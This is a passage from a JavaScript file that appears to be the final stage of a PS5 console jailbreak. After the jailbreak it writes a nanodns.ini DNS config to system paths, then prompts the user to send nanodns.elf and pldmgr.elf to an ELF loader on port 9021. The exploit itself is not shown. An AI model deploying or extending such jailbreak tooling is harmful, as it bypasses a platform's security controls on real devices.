                "# Exceptions (needed for online features)\n" +
                "stun.*.playstation.net=\n" +
                "ena.net.playstation.net=\n";

            const dns_paths = [
                "/data/nanodns/nanodns.ini",
                "/user/temp/nanodns.ini",
            ];
            let dns_written = false;
            for (const dp of dns_paths) {
                try {
                    write_file(dp, nanodns_ini);
                    await ulog("nanodns-config: written to " + dp);
                    dns_written = true;
                    break;
                } catch (_) { /* skip */ }
            }
            if (dns_written) {
                await ulog("nanodns-config: SUCCESS - nanodns.ini ready");
            } else {
                await ulog("nanodns-config: could not write (needs JB write access)");
            }
        } catch (e) {
            await ulog("nanodns-config: error: " + e.message);
        }

        // ═══════════════════════════════════════════════════════
        // USB ELF AUTO-DETECT + LAUNCH (by ayed oraybi)
        // Automatically detects nanodns.elf and pldmgr.elf on USB
        // and sends them to elfldr on :9021
        // ═══════════════════════════════════════════════════════
        try {
            progress(98, "USB ELFs");
            await ulog("usb-elfs: scanning USB drives for nanodns/pldmgr...");

            const USB_ELFS = [
                { name: "nanodns", files: ["nanodns.elf", "nanodns_v*.elf"] },
                { name: "pldmgr", files: ["pldmgr.elf", "pldmgr_v*.elf", "pldmgr_v*.0.elf"] },
            ];

            // Note: In Y2JB sandbox, we can use read_file to check USB paths
            // The elfldr on :9021 accepts ELF binaries via TCP
            // To auto-launch: send ELF binary to PS5:9021 via TCP relay
            // (This is informational — actual launch requires TCP relay from terminal)
            await ulog("usb-elfs: Place nanodns.elf + pldmgr.elf on USB drive");
            await ulog("usb-elfs: After JB, send them to :9021 via your TCP relay");
            send_notification("JB Complete!\nPut nanodns.elf + pldmgr.elf\non USB -> send to :9021");
        } catch (e) {
            await ulog("usb-elfs: error: " + e.message);
        }

        progress(100, "DONE!");
        if (_overlay_created) { try { var ob = document.getElementById("p2jb-box"); if (ob) { ob.style.borderColor = "#ff1744"; } var pe = document.getElementById("p2jb-pct"); if (pe) pe.textContent = "100%"; var se = document.getElementById("p2jb-stage"); if (se) { se.textContent = "JAILBREAK COMPLETE!"; se.style.color = "#ff1744"; } var bf = document.getElementById("p2jb-bar-fill"); if (bf) { bf.style.width = "100%"; bf.style.background = "#ff1744"; } } catch(_) {} }
